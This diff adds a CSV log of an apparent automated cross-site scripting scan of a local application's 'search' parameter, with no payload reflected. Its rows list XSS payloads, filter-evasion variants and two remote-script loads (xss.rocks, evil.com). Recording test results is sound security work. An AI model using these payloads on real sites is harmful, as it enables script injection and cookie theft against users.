@@ -1,0 +1,566 @@
+Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert('XSS')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert(""XSS"")</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>prompt(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>confirm(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.cookie)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.domain)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.origin)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script src=//xss.rocks/xss.js></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script src=https://evil.com/xss.js></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert(1)</script></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=confirm(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert`1`>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#40;1&#41;</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=confirm(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert('XSS')>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert`1`>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(document.cookie)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img/src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=""x"" onerror=""alert(1)"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src='x' onerror='alert(1)'>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onpageshow=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onfocus=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onhashchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=confirm(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input onblur=alert(1) autofocus><input>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe src=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe src=""javascript:alert(1)"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,'-alert(1)-',NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details open ontoggle=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<object data=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<embed src=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<audio src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video><source onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=javascript:alert(1)>click</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<a href=""javascript:alert(1)"">click</a>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form action=javascript:alert(1)><input type=submit>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style>@import'javascript:alert(1)';</style>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style onload=alert(1)></style>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table background=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><td background=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div style=width:expression(alert(1))>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert&#40;1&#41;</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert&#x28;1&#x29;</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061lert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61lert(1)')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onabort=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onactivate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onafterprint=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onafterupdate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeactivate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforecopy=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforecut=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforedeactivate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforepaste=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeprint=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeunload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeupdate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onblur=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbounce=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncellchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncontextmenu=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncontrolselect=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncopy=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncut=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondataavailable=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondatasetchanged=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondatasetcomplete=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondblclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondeactivate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondrag=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragend=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragenter=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragleave=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragover=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondrop=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerrorupdate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfilterchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfinish=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocus=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocusin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocusout=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onhelp=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oninput=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeydown=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeypress=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeyup=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onlayoutcomplete=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onlosecapture=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousedown=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseenter=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseleave=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousemove=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseout=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseover=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseup=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousewheel=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmove=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmoveend=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmovestart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpaste=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpropertychange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onreadystatechange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onreset=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresize=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresizeend=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresizestart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowenter=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowexit=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowsdelete=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowsinserted=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onscroll=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselect=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselectionchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselectstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onstop=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onsubmit=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onunload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:alert('XSS'),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:prompt(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:confirm(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"data:text/html,<script>alert(1)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oncut=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrag=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrop=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onfocus=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oninput=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onmove=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onpaste=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onreset=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onresize=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onscroll=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onselect=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onstart=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onstop=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onsubmit=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,alert(1),NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img	src=x	onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ScRiPt>alert(1)</ScRiPt>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sCrIpT>alert(1)</sCrIpT>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SCRIPT>alert(1)</SCRIPT>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<IMG SRC=x ONERROR=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SVG ONLOAD=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SvG oNlOaD=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,< script >alert(1)< / script >,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,< img src=x onerror=alert(1) >,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,< svg onload=alert(1) >,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<<script>script>alert(1)<</script>/script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=""x""onerror=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg//onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Csvg%20onload=alert(1)%3E,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert`1`</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert`1`>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert`1`>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>/**/alert(1)/**/</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script><!---->alert(1)<!----></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=/**/alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('alert(1)')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>eval(""alert(1)"")</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=eval('alert(1)')>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=eval('alert(1)')>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>Function('alert(1)')()</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>new Function('alert(1)')()</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=Function('alert(1)')()>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setTimeout('alert(1)',0)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>setInterval('alert(1)',0)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>location='javascript:alert(1)'</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>location.href='javascript:alert(1)'</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061lert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=\u0061lert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61lert(1)')</script>,NO_REFLECTION,No,,Info
